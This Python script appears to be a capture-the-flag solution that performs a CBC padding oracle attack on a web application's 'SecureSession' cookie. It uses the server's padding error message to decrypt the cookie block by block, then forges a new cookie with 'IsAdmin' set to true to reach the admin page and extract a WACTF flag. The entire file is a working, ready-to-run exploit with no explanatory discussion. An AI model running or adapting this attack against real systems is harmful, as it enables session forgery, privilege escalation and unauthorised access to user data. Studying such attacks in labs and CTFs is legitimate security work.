import re
import sys
import base64
import requests
import urllib.parse

TARGET = ''

# Send a request and check the padding
# True -> valid padding
# False -> invalid padding
def check_padding(data):
    r = requests.get(TARGET, cookies={'SecureSession': data})
    if 'Padding is invalid and cannot be removed' in r.text:
        return False
    else:
        return True

# Formats the cookie the way the application expects it
def create_cookie(iv, block1, block2):
    s = base64.b64encode(iv) + b'|' + base64.b64encode(block1 + block2)
    s = s.decode('utf-8')
    return urllib.parse.quote(s)

# Cycles through 0-256 at position n to find valid padding
# This assumes block1 has already been prepared to ensure
# padding values are correct at positions after n
def find_valid_padding(iv, block1, block2, n):
    payload = bytearray(block1)
    for i in range(0, 256):
        payload[n] = i
        cookie = create_cookie(iv, payload, block2)
        padded = check_padding(cookie)
        if padded == True:
            return i

# decrypts block2 and returns it
def decrypt_block(iv, block1, block2):
    intermediate_block = bytearray(b'\x00'*16)
    for i in range(15, -1, -1):
        expected_padding = 16-i
        payload = bytes([x^expected_padding for x in intermediate_block])
        padding_byte = find_valid_padding(iv, payload, block2, i)
        intermediate_block[i] = expected_padding^padding_byte

    decrypted_block = bytearray(b'\x00'*16)
    for i in range(0, 16):
        decrypted_block[i] = block1[i]^intermediate_block[i]

    return bytes(decrypted_block)

# decrypts all blocks in the list except the first
# assumes blocks are in the correct order
def decrypt_block_list(iv, blocks):
    decrypted = []
    for i in range(1, len(blocks)):
        b = decrypt_block(iv, blocks[i-1], blocks[i])
        decrypted.append(b)
        print('Decrypted block {}'.format(i))
    
    return decrypted

# finds value for the previous block for to block to decrypt to block_target
def encrypt_block(iv, block, block_target):
    intermediate_block = bytearray(b'\x00'*16)
    for i in range(15, -1, -1):
        expected_padding = 16-i
        payload = bytes([x^expected_padding for x in intermediate_block])
        padding_byte = find_valid_padding(iv, payload, block, i)
        intermediate_block[i] = expected_padding^padding_byte
    
    previous_block = bytearray(b'\x00'*16)
    for i in range(0, 16):
        previous_block[i] = block_target[i]^intermediate_block[i]
    
    return bytes(previous_block)

# creates a ciphertext which will decrypt to the block list provided
# assumes blocks are in the correct order and correctly padded
def encrypt_block_list(iv, blocks):
    encrypted = [b'\x00'*16]
    for i in range(len(blocks)-1, -1, -1):
        b = encrypt_block(iv, encrypted[0], blocks[i])
        encrypted.insert(0, b)
        print('Encrypted block {}'.format(i))
    
    return encrypted

# gets a session and decrypts it
def decrypt_cookie():
    s = requests.Session()
    r = s.get(TARGET)
    v = s.cookies.get_dict()['SecureSession']
    v = urllib.parse.unquote(v)
    v = v.split('|')
    iv = base64.b64decode(v[0])
    complete_ciphertext = base64.b64decode(v[1])
    ciphertext = [iv]
    for i in range(0, len(complete_ciphertext), 16):
        ciphertext.append(complete_ciphertext[i:i+16])
    
    decrypted = decrypt_block_list(iv, ciphertext)
    print('Decrypted session')
    print(decrypted)

# grabs the flag from the admin page by encrypting a new session cookie
# with 'IsAdmin' set to true
def get_flag():
    s = requests.Session()
    r = s.get(TARGET)
    v = s.cookies.get_dict()['SecureSession']
    v = urllib.parse.unquote(v)
    v = v.split('|')
    iv = base64.b64decode(v[0])
    admin_session = [b'{"Username":"gue', b'st","IsAdmin":tr',b'ue}\x0d\x0d\x0d\x0d\x0d\x0d\x0d\x0d\x0d\x0d\x0d\x0d\x0d']
    encrypted_cookie = encrypt_block_list(iv, admin_session)

    iv = encrypted_cookie[0]
    msg = b''.join(encrypted_cookie[1:])

    newcookie = base64.b64encode(iv) + b'|' + base64.b64encode(msg)
    newcookie = newcookie.decode('utf-8')
    newcookie = urllib.parse.quote(newcookie)

    r = s.get(TARGET + '/Home/Admin', cookies={'SecureSession': newcookie})
    m = re.search('.+(WACTF\{.+\}).+', r.text, re.DOTALL)
    if m:
        print(m.group(1))

if len(sys.argv) != 3:
    print('Usage: python {} target [ decrypt | getflag ]'.format(sys.argv[0]))
    print('E.g.   python {} http://192.168.1.1/ decrypt'.format(sys.argv[0]))
    sys.exit(1)

TARGET = sys.argv[1]

if sys.argv[2] == 'decrypt':
    decrypt_cookie()
elif sys.argv[2] == 'getflag':
    get_flag()
else:
    print('Usage: python {} target [ decrypt | getflag ]')
    print('E.g.   python {} http://192.168.1.1/ decrypt'.format(sys.argv[0]))
    sys.exit(1)
